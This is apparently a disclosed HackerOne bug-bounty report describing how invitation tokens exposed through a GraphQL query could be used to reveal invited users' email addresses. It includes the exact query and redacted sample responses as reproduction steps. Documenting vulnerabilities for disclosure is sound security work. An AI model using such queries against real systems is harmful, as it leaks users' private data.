# Customer private program can disclose email any users through invited via username

## Report Details
- **Report ID**: 807448
- **URL**: https://hackerone.com/reports/807448
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-02-28T23:15:43.015Z
- **Disclosed**: 2020-05-15T17:24:34.443Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
## Summary:
Hey team,This bug could have been used by my calculations a long time ago
## Steps To Reproduce:
1)Go to https://hackerone.com/hackerone_h1p_bbp3/launch
2)Take invite via username
3)Input username , send invite
3.1)When an invite is created, we get a token
4)Now Go use GraphQL query

https://hackerone.com/graphql?

`{"query": "query {team(handle:\\"hackerone_h1p_bbp3\\"){_id,handle,soft_launch_invitations{total_count,nodes{... on InvitationsSoftLaunch{token}}}}}"}`

Answer:

`{"data":{"team":{"_id":"47388","handle":"hackerone_h1p_bbp3","soft_launch_invitations":{"total_count":5,"nodes":[{"token":"████████"},{"token":"███"},{"token":"████"},{"token":"██████"},{"token":"████████"}]}}}}`
████


5)Now check .json - █████████

`{"token":"████████","type":"Invitations::SoftLaunch","auth_option":"has-no-access","email":"████@managed.hackerone.com","status":"valid","expires_at":"2020-03-06T21:33:31.689Z","recipient":{"username":"zebra","profile_picture":"███","url":"https://hackerone.com/zebra"},"open_soft_launch_invitations_count":0}`


`"email":"██████████@managed.hackerone.com"`
██████
6)You need to do this immediately before the user accepts or rejects our request for an invite

Thanks, @haxta4ok00

## Impact

Disclosed email

## Attachments
No attachments
